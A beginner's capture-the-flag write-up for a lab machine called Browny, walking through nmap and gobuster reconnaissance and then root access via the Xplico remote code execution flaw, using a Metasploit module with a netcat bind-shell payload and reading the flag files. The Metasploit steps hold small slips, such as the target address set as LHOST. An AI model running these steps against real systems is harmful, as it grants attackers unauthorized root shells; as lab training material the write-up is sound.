---
title: "Browny Machine Writeup (easy)"
date: 2019-04-28T01:12:17+02:00
author: "Ahmed Amin"
draft: true
cover: "cover.jpg"
---


======================
<h2>Quick Summary</h2>


Hey guys , today I will walkthrough step by step in Browny Machine.
this Machine is so good for beginner in pentration testing you will gonna learn a lot in this experenice.
It is an easy linux machine , We will exploit Xplico Remote Code Execution in a vulnerable version Xplico that listen on port 9876 by default. There is a hidden end-point at inside of the Xplico that allow anyone to create a new user that can execute a terminal command under the context of the root user.
its ip is 10.1.1.17 I gonna added it to /etc/hosts as Browny.lab<br>
Let’s get Start !


======================
<h2>Infomartions Gathering Phase</h2>
<h3>#Nmap</h3>

We will use nmap tool for collecting informations about our target such as what services are running , whats its versions and does those services has potential vulnerabilities.

<style>
pre {
    color: cyan;
}
</style>
<pre>
nmap -sV -sC -sT Browny.lab
</pre>

> sV: for version detection <br>
> sC: for lunch default scripts againts services <br>
> sT: for system is used to open a connection to every interesting port on the machine 





![nmap.PNG](/posts/images/nmap.PNG)

<h3>we notice that there three  ports are open.</h3>
we can access the machine via ssh protocol but we don't have any crediantials to able to access via ssh.
so we can to  do http enumeration for finding any clues that lead us to access the machine through that way



it just a dummy html page. and nothing more.

<img src = "/posts/images/dummy.png">

<h3>#Brupsuite</h3>
Via Brupsuite lets check The Get Request to server and Response Maybe we found something useful.
<img src = "/posts/images/dummy2.PNG">
Not Much except the explico that will be a great indicator for gaining access for this machine.

always while you doing http enumeration try to brute force subdirectries for finding any intersesting web pages could give you a greate information about your target

<h3>#Gobuster</h3>
Gobuster is such a greate tool for brute forcing hidden directories in web application.
<pre>
gobuster -u 'http://Browny.lab' -w /usr/share/wordlists/dirb/common.txt
</pre>

<img src = "/posts/images/dummy3.PNG">
based on the response code we got they have 403 which mean we don't have premission to access to those webpages.


<h2>vulnerabilty detection and analysis</h2>
after doing info-garthing we got only one clue that can lead us to gain access. the explico service is running.
so what is explico ? explico is a piece of software that used for parsing pcap files that help forensics team
for collecting evidence and artifacts.Xplico extracts each email (POP, IMAP, and SMTP protocols), all HTTP contents, each VoIP call (SIP), FTP, TFTP, and so on. the problem is  There is a hidden end-point at inside of the Xplico that allow anyone to create a new user with premission of root.once the pcap file uploaded .
Xplico execute an operating system command in order to calculate checksum of the file. Name of the for this operation is direclty taken from user input and then used at inside of the command without proper input validation. so we can execute a shell on system and gain access.<br> <a href ="https://www.rapid7.com/db/modules/exploit/linux/http/xplico_exec">there is a metasploit module will do all the hard works to take advantage of this flaw</a>


<h2>Exploitation Phase</h2>
<h3>#Metasploit</h3>

lets lunch the Metasploit framework and doing research on xplico http exploit
By doing search we will find exploit with rank excellent
<pre>
grep http search xplico
use exploit/linux/http/xplico_exec
</pre>
![meta1.PNG](/posts/images/meta1.PNG)
<pre>
show options
set LHOST 10.253.x.x
set LHOST 10.1.1.17
show payloads
set  PAYLOAD cmd/unix/bind_netcat
</pre>

![meta2.PNG](/posts/images/meta2.png)

and now we have a shell.let do id command line to know make sure about privilege as root
we play an easy machine so don't need to privilege escalation or any complicated stuffs. all we need to do
is explore the system files after we sure that we are root. and open the root.txt and user.txt to  get the flags
<pre> 
id
pwd
find /home
find /root
cat /home/granit/usr.txt
cat /root/root.txt
</pre>
==============================
<h2>Understanding The Exploitation in Depth</h2>
I recommend you to read this artical <a href="https://pentest.blog/advisory-xplico-unauthenticated-remote-code-execution-cve-2017-16666/">Readme</a> will explain to you the details of the flaw in explico
this step is essential to not be a script kid that know doing stuffs without knowing what happing behind the scene

that's all about this machine. 
<h4>Stay tuned for upcoming series</h4>
<h3>Feedback is it very appreciate</h3>

